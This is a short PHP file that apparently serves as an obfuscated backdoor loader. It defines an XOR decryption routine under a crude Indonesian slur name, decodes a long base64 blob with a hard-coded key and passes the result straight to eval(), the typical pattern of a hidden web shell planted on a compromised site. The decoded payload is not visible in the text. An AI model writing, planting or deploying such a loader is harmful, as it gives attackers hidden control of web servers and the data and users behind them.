<?php
function kontol($str,$pwd){
	$pwd=base64_encode($pwd);
	$str=base64_decode($str);
	$enc_chr="";
	$enc_str="";
	$i=0;
	while($i<strlen($str)){
		for($j=0;$j<strlen($pwd);$j++){
		$enc_chr=chr(ord($str[$i])^ord($pwd[$j]));
		$enc_str.=$enc_chr;
		$i++;
			if($i>=strlen($str))break;
		}
	}
	return base64_decode($enc_str);
}
$key = "gsdfs";
$data = "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";
$ress = kontol($data, $key);
eval ($ress);?>